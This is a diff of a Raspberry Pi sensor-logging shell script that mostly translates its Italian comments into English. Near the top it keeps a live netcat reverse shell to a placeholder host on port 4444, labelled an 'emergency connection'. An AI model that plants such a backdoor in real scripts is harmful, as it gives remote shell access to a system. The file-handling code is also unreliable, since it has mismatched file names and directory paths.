@@ -4,25 +4,24 @@
 
 echo "Starting Daemon" | figlet #only a cool start
 
-#reverse shell for emergency connection, if it will not find any connection, it will pass over
+#reverse shell for emergency connection, if it will not find any connection, it will move on
 
 echo "Attempt reverse shell"
-rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1 | nc <ipPc> 4444 -q 10 > /tmp/f  #work-around for netcat -e option
 
+rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1 | nc <ipPc> 4444 -q 10 > /tmp/f  #work-around for netcat -e option
 sleep 10s
 
 #cicle for sending saving and removing file (it also run the py script for retrive data)
 
 while true; do
-
-    #creazione variabile con data corrente(yyyy-mm-dd)
+    #creating variable for folder(yyyy-mm-dd)
     d=$(date -I)
-    #creazione variabile con ora (hh-mm)
+    #creating variable for files (hh-mm)
     o=$(date +%R)
 
     python detection.py #retrive data from sensor
     
-    echo "detection..."
+    echo "Detection..."
 
     sleep 1m  #security of data presence delay
 
@@ -34,19 +33,20 @@ while true; do
 
     sleep 3s
 
-    #controllo se la cartella con la data esiste, se no la creo
+    #check if folder exist, if not it will make it
     if [ -d /home/pi/rilevation/$d ]; then
-        echo "la cartella esiste già"
+        echo "Folder alredy exist, Moving on"
     else
+        echo "Making directory $d"
         mkdir $d
     fi
 
-    #rinomino i file delle misurazioni aggiungendo l'ora
+    #rename files with adding h,m
     mv /home/pi/temperature.txt /home/pi/temperature-$o.txt
     mv /home/pi/humdity.txt /home/pi/humdity-$o.txt
     mv /home/pi/co2.txt /home/pi/co2-$o.txt
 
-    #copio i file rinominati nella cartella con la data
+    #copy file in rilevation/$d directory
     cp -r /home/pi/temperature-$o.txt /home/pi/rilevation/$d    #saving file in archive directory
     cp -r /home/pi/humidity-$o.txt /home/pi/rilevation/$d
     cp -r /home/pi/co2-$o.txt /home/pi/rilevation/$d
